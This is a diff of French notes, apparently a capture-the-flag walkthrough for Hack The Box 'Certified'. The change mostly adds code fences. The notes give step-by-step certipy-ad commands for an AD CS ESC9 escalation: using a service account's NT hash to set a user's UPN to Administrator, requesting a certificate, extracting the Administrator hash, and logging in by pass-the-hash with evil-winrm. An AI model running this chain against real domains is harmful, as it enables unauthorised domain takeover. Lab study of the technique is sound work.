@@ -9,28 +9,28 @@ ca_operator peut enrôler sur le template vulnérable ESC9
 
 Étape 1 — Récupérer le UPN actuel de ca_operator (pour le restaurer après)
 
-bash
+```bash
 certipy-ad account read \
   -u 'management_svc@certified.htb' \
   -hashes ':a091c1832bcdd4677c28b5a6a1295584' \
   -user ca_operator \
   -dc-ip 10.129.66.123
-
+```
 Note le UPN affiché — tu en auras besoin pour le restore.
 
 Étape 2 — Changer le UPN de ca_operator → Administrator
 
-bash
+```bash
 certipy-ad account update \
   -u 'management_svc@certified.htb' \
   -hashes ':a091c1832bcdd4677c28b5a6a1295584' \
   -user ca_operator \
   -upn 'Administrator' \
   -dc-ip 10.129.66.123
-
+```
 Étape 3 — Demander le certificat en tant que ca_operator
 
-bash
+```bash
 certipy-ad req \
   -u 'ca_operator@certified.htb' \
   -p 'PASSWORD_CA_OPERATOR' \
@@ -38,33 +38,38 @@ certipy-ad req \
   -template 'NOM_DU_TEMPLATE_ESC9' \
   -dc-ip 10.129.66.123
 # → génère ca_operator.pfx mais lié au UPN Administrator
-
+```
 Étape 4 — Restaurer le UPN original de ca_operator (cleanup)
 
-bash
+```bash
 certipy-ad account update \
   -u 'management_svc@certified.htb' \
   -hashes ':a091c1832bcdd4677c28b5a6a1295584' \
   -user ca_operator \
   -upn 'ca_operator@certified.htb' \
   -dc-ip 10.129.66.123
-
+```
 Étape 5 — Authentification avec le certificat
 
-bash
+```bash
 certipy-ad auth \
   -pfx 'ca_operator.pfx' \
   -domain 'certified.htb' \
   -dc-ip 10.129.66.123
 # → retourne le hash NT de Administrator
+```
 
+Ou directemnent sur l'administrator
+```bash 
+certipy-ad auth  -pfx 'administrator.pfx' -domain 'certified.htb' -dc-ip 10.129.231.186
+```
 Étape 6 — Connexion
 
-bash
+```bash
 evil-winrm -i 10.129.66.123 \
   -u Administrator \
   -H 'HASH_NT_ADMINISTRATOR'
-
+```
 Résumé de la chaîne :
 
 management_svc (GenericAll sur ca_operator)
